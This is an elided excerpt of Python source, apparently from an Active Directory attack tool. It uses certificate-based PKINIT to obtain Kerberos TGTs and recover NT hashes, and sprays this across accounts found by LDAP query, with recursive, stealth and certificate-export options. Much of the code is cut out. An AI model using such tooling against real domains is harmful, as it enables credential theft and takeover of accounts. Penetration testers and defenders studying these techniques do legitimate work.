...
try:
    ...
    PKINIT_TOOLS_AVAILABLE = True
except ImportError as e:
    PKINIT_TOOLS_AVAILABLE = False
    PKINIT_TOOLS_ERROR = str(e)
...
def get_tgt_and_nt_hash(cert_file, key_file, pfx_file, pfx_password, domain, username, dc_ip, test_user, output_dir='', debug=False, stealth=False, write_func=None):
    ...
    if not PKINIT_TOOLS_AVAILABLE:
        if debug:
            write_func(Colors.format(f"[-] PKINIT tools not available: {PKINIT_TOOLS_ERROR}"))
        write_func(Colors.format(f"[-] PKINIT tools not available. Skipping automatic TGT/NT hash retrieval."))
        return None, None
    
    # Use output directory for ccache file
    if output_dir:
        ccache_file = os.path.join(output_dir, f"{test_user}.ccache")
    else:
        ccache_file = f"{test_user}.ccache"
    ...
    try:
        ...
        if not asrep_key or not ccache_path:
            write_func(Colors.error(f"[-] Failed to get TGT for {test_user}"))
            return None, None
        ...
        if stealth:
            ...
            write_func(Colors.success(f"[+] SUCCESS! TGT obtained for {test_user} (stealth mode - no NT hash extraction)"))
        ...
        if nt_hash:
            ...
            write_func(Colors.success(f"[+] SUCCESS! Recovered NT Hash for {test_user}: {nt_hash}"))
        else:
            write_func(Colors.error(f"[-] Could not extract NT hash for {test_user}"))
...
def main(
    ...
    exclude_users   : str   = typer.Option(None, '--exclude', help='Comma-separated list of users to exclude from spray (e.g., Administrator,Domain Admins)'),
    export_type     : str   = typer.Option('PFX', '--export', help='Export certificate format: PEM or PFX (default: PFX)'),
    cert_password   : str   = typer.Option(None, '--cert-password', help='Password for PFX export (random if not provided)'),
    ...
    try:
        ...
        def perform_spray(ldap_sess, search_base_val, excluded_users_list, output_directory='', current_user=None, current_hash=None, already_compromised=None, auto_remove=True, pre_queried_accounts=None, stealth_mode=False):
            ...
            if pre_queried_accounts is not None:
                ...
                try:
                    accounts_to_spray, domain_admins_set_from_query, domain_controllers_set_from_query = query_all_accounts(ldap_sess, search_base_val, excluded_users_list)
        ...
        if spray:
            ...
            excluded_users_list = []
            if exclude_users:
                excluded_users_list = [u.strip() for u in exclude_users.split(',')]
                if debug:
                    print(f"[*] Excluding users: {excluded_users_list}")
            ...
            if user_pass_file and credentials_to_use:
                ...
                try:
                    ...
                    accounts_list, domain_admins_set, domain_controllers_set = query_all_accounts(query_ldap_session, search_base, excluded_users_list)
            ...
            if recursive:
                ...
                if pre_queried_accounts and isinstance(pre_queried_accounts, tuple) and len(pre_queried_accounts) == 3:
                    ...
                    try:
                        accounts_list_recursive, domain_admins_set, domain_controllers_set_from_recursive = query_all_accounts(ldap_session, search_base, excluded_users_list)
                ...
                if ldap_session.result['result'] == 0:
                    ...
                    if export_type_upper == "PEM":
                        ...
                        if not CRYPTOGRAPHY_AVAILABLE:
                            ...
                            print(Colors.success(f"[+] PFX password: {cert_password}"))
